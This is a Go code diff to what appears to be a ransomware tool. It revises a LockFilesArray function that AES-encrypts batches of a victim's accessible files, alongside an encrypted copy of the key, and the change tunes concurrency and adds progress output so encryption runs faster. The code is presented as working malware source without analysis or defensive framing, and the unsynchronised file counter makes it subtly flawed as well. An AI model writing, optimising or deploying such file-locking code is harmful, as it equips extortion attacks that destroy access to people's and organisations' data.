@@ -9,7 +9,6 @@ import (
 	cf "frostbite.com/coldfire"
 	enc "frostbite.com/encryption"
 	scan "frostbite.com/tools/scan"
-	"github.com/zenthangplus/goccm"
 )
 
 var pl = fmt.Println
@@ -75,22 +74,32 @@ func GetListOfAccessibleFiles(fileList []string) []string {
 func LockFilesArray(filesToEncrypt []string, AESKey []byte, encryptedAESKey []byte) {
 	//scan only non hidden directories
 
-	runtime.GOMAXPROCS(2)
-	c := goccm.New(4)
+	// runtime.GOMAXPROCS(16)
+	numCPU := runtime.NumCPU()
+	runtime.GOMAXPROCS(numCPU - 2)
 
 	wg := sync.WaitGroup{}
-	wg.Add(len(filesToEncrypt))
 
-	for _, filePath := range filesToEncrypt {
-		go func(filePath string) {
-			enc.EncryptFileAES(AESKey, filePath)
+	// limit the number of goroutines
+	concurrencyLimit := numCPU * 2
+	filesProcessed := 0
+	for i := 0; i < len(filesToEncrypt); i += concurrencyLimit {
+		// wait until there's room for another goroutine to start
+		for j := 0; j < concurrencyLimit && i+j < len(filesToEncrypt); j++ {
+			wg.Add(1)
+			go func(index int) {
+				defer wg.Done()
+				_ = enc.EncryptFileAES(AESKey, filesToEncrypt[index])
+				//append file path to file named "encryptedFiles.txt"
+				filesProcessed++
+			}(i + j)
+		}
 
-			// os.Remove(filePath)
-			wg.Done()
-			c.Done()
-			return
-		}(filePath)
+		//log the progress in percent
+		percent := (float64(i) / float64(len(filesToEncrypt))) * 100
+		//print progress in percent, limit to 2 decimal places
+		fmt.Printf("Progress: %.2f%%\r", percent)
+		wg.Wait()
 	}
-	wg.Wait()
-
+	pl("Files processed: ", filesProcessed)
 }
